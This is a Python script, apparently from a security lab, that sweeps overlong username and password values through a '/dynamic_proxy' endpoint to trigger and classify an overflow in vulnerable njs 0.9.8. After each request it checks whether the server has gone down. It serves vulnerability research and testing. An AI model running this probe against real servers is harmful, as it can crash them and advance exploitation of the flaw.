#!/usr/bin/env python3
"""HTTP-only length sweep for the njs js_fetch_proxy overflow lab."""

from __future__ import annotations

import argparse
import http.client
import time
import urllib.parse


def parse_target(value: str, fallback_port: int) -> tuple[str, int]:
    if "://" in value:
        parsed = urllib.parse.urlparse(value)
        return parsed.hostname or "127.0.0.1", parsed.port or fallback_port
    if ":" in value.rsplit("@", 1)[-1]:
        host, port = value.rsplit(":", 1)
        return host, int(port)
    return value, fallback_port


def request(host: str, port: int, path: str, timeout: float = 3.0) -> tuple[int, bytes]:
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", path)
        resp = conn.getresponse()
        body = resp.read()
        return resp.status, body
    finally:
        conn.close()


def dynamic_path(user_len: int, pass_len: int) -> str:
    query = urllib.parse.urlencode({"u": "A" * user_len, "p": "B" * pass_len})
    return f"/dynamic_proxy?{query}"


def healthy(host: str, port: int) -> bool:
    try:
        status, body = request(host, port, "/", timeout=1.5)
    except Exception:
        return False
    return status == 200 and b"njs fetch proxy lab ok" in body


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Classify vulnerable njs 0.9.8 credential lengths over HTTP."
    )
    parser.add_argument("--target", default="127.0.0.1:19431", help="HOST:PORT")
    parser.add_argument("--port", type=int, default=19431)
    parser.add_argument("--user-lengths", default="16,64,96,120,127,128,160,256,512")
    parser.add_argument("--pass-lengths", default="16,64,96,120,127,128,160,256,512")
    parser.add_argument("--mode", choices=("user", "pass", "both"), default="both")
    parser.add_argument("--delay", type=float, default=0.15)
    args = parser.parse_args()

    host, port = parse_target(args.target, args.port)
    user_lengths = [int(v) for v in args.user_lengths.split(",") if v]
    pass_lengths = [int(v) for v in args.pass_lengths.split(",") if v]

    print(f"target {host}:{port}")
    print("mode   len sweep over HTTP only; ASLR left enabled")
    print("cols   user pass status body_len sample health")

    if not healthy(host, port):
        print("preflight failed")
        return 2

    pairs: list[tuple[int, int]] = []
    if args.mode in ("user", "both"):
        pairs.extend((ulen, 16) for ulen in user_lengths)
    if args.mode in ("pass", "both"):
        pairs.extend((16, plen) for plen in pass_lengths)
    if args.mode == "both":
        pairs.extend((ulen, plen) for ulen in user_lengths for plen in pass_lengths)

    seen: set[tuple[int, int]] = set()
    for ulen, plen in pairs:
        if (ulen, plen) in seen:
            continue
        seen.add((ulen, plen))

        try:
            status, body = request(host, port, dynamic_path(ulen, plen))
            sample = body[:48].replace(b"\n", b"\\n")
            result = f"{status:<6} {len(body):<8} {sample!r}"
        except Exception as exc:
            result = f"{type(exc).__name__:<6} {'-':<8} {str(exc)[:48]!r}"

        time.sleep(args.delay)
        health = "up" if healthy(host, port) else "down"
        print(f"{ulen:<5} {plen:<5} {result:<72} {health}")
        time.sleep(args.delay)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
